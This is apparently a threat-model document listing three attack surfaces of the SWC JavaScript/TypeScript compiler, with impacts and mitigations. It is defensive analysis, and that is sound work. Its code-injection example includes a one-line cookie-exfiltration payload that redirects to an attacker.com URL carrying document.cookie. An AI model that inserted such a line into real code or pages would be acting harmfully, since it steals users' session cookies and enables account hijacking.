## Attack Surface: [Malicious code injection through untrusted input processed by SWC](./attack_surfaces/malicious_code_injection_through_untrusted_input_processed_by_swc.md)

*   **Description:** Malicious code injection through untrusted input processed by SWC.
    *   **How SWC Contributes to the Attack Surface:** SWC compiles or transforms code. If untrusted code is directly fed to SWC without sanitization, malicious scripts can be embedded and potentially executed.
    *   **Example:** A user provides JavaScript code as input to a feature that uses SWC to transpile it before execution (e.g., a plugin system). The user injects code like `window.location.href = 'https://attacker.com/steal?data=' + document.cookie;`.
    *   **Impact:** Remote Code Execution (RCE) within the application's environment, data theft, session hijacking, or other malicious actions depending on the context of execution.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Thoroughly sanitize and validate any user-supplied code or configuration before passing it to SWC.
        *   Avoid directly executing user-provided code if possible. Consider alternative, safer approaches.
        *   Implement strict sandboxing or isolation for code processed by SWC if it involves untrusted sources.
        *   Use a Content Security Policy (CSP) to restrict the capabilities of executed scripts.

## Attack Surface: [Exploiting vulnerabilities within SWC's parsing logic](./attack_surfaces/exploiting_vulnerabilities_within_swc's_parsing_logic.md)

*   **Description:** Exploiting vulnerabilities within SWC's parsing logic.
    *   **How SWC Contributes to the Attack Surface:** SWC parses JavaScript and TypeScript code. Bugs in the parser can be exploited by providing specially crafted, malicious code that triggers unexpected behavior or crashes.
    *   **Example:** An attacker crafts a specific JavaScript code snippet with unusual syntax that exploits a buffer overflow vulnerability in SWC's parser, leading to a crash or potentially RCE within the SWC process.
    *   **Impact:** Denial of Service (DoS) by crashing the application, potential Remote Code Execution (RCE) if the vulnerability allows it.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Keep SWC updated to the latest version to benefit from bug fixes and security patches.
        *   Implement robust error handling around SWC's processing to prevent crashes from propagating and potentially revealing sensitive information.
        *   Consider using static analysis tools or fuzzing techniques on SWC itself to identify potential parsing vulnerabilities (though this is primarily the responsibility of the SWC project).

## Attack Surface: [Bugs in SWC's transformation logic leading to the generation of vulnerable code](./attack_surfaces/bugs_in_swc's_transformation_logic_leading_to_the_generation_of_vulnerable_code.md)

*   **Description:** Bugs in SWC's transformation logic leading to the generation of vulnerable code.
    *   **How SWC Contributes to the Attack Surface:** SWC applies various transformations to the code. Bugs in these transformations could inadvertently introduce security vulnerabilities into the generated JavaScript.
    *   **Example:** A bug in a specific SWC transformation might incorrectly handle a certain code pattern, leading to the generation of JavaScript code vulnerable to Cross-Site Scripting (XSS).
    *   **Impact:** Introduction of security vulnerabilities (e.g., XSS, injection flaws) in the application's frontend code.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Keep SWC updated to benefit from bug fixes in transformation logic.
        *   Thoroughly test the output generated by SWC, especially after updates or configuration changes.
        *   Use static analysis tools on the generated JavaScript code to identify potential vulnerabilities.
